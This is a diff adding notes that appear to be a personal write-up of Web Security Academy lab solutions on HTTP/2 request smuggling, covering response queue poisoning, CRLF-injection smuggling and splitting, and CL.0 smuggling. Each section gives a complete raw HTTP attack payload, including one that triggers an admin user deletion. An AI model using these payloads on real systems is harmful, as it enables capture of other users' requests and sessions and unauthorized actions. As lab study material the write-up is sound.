@@ -338,3 +338,90 @@ Content-Length: 5
 x=1
 ```
 
+### Response queue poisoning via H2.TE request smuggling
+**Payload** :
+```http
+POST /asfd HTTP/2
+Host: 0a51000c03cd50cc8201b5a600240008.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=K4td082v3lm1QjnoFU2j6nPJZhUAZ99Q
+Transfer-Encoding: chunked
+
+0
+
+GET /asfd HTTP/1.1
+Host: 0a51000c03cd50cc8201b5a600240008.web-security-academy.net
+
+
+```
+The objective of this lab is to get response from admin request while login, so what we need just spam the smuggled request until got victim response. Use Intruder to help spam
+![[Pasted image 20260120064509.png]]
+
+
+### HTTP/2 request smuggling via CRLF injection
+**Payload** :
+on the lab, frontend will delete header `Transfer-Encoding`, so we need to bypass it by add new header on burpsuite but the value contain `Bar\r\nTransfer-Encoding: chunked` which Transfer-Encoding won't detected as header, but the process will accept the `Transfer-Encoding`, then the smuggled request is search feature that will save history search, so the request of victim will saved to our history session
+
+```http
+POST / HTTP/2
+Host: 0a2200af0393e0538387c838004f0030.web-security-academy.net
+Sec-Ch-Ua-Mobile: ?0
+Cookie: session=yR9yKGhYADrIHCNe7I12nqARmM3Khgol
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+X-Ignore: nore\r\nTransfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: 0a2200af0393e0538387c838004f0030.web-security-academy.net
+Cookie: session=yR9yKGhYADrIHCNe7I12nqARmM3Khgol
+Content-Length: 1000
+Content-Type: application/x-www-form-urlencoded
+
+search=asdfd
+```
+![[Pasted image 20260120072158.png]]
+
+### HTTP/2 request splitting via CRLF injection
+**Payload** :
+
+So it basically using the same concept as before but, the CRLF Injection contain another request not `Transfer-Encoding` header, which we will wait the response from victim request
+```http
+GET /sadf HTTP/2
+Host: 0a7c007f0395cee2860ee9e800690067.web-security-academy.net
+Cookie: session=pi43LL0VddIRbnSAFJl01qI6h47V3KeX
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+X-Ignore: bar\r\n\r\nGET /x HTTP/1.1\r\nHost: 0a7c007f0395cee2860ee9e800690067.web-security-academy.net
+
+
+```
+![[Pasted image 20260120075401.png]]
+
+### CL.0 request smuggling
+**Payload** :
+```http
+POST /resources/images/blog.svg HTTP/2
+Host: 0a6e001a043e74d286654d0800a5005f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Connection: Keep-Alive
+Content-Length: 55
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-Ignore: x
+```
+
+On  CL.0 concept, backend will treat the request with `Content-Length: 0`, it means, that body request will treat as another request. but it required on the same connection (using header `Connection: Keep-Alive`, and send as group sequential single connection). So the process is look like this
+**Frontend**
+1. Send request (with body smuggled request)
+2. Send normal request
+
+**Backend**
+1. Receive First Request (treat content length as 0)
+2. Process smuggled request
+3. Receive normal request, but it saved on X-Ignore: x
+![[Pasted image 20260120094133.png]]
+![[Pasted image 20260120094147.png]]
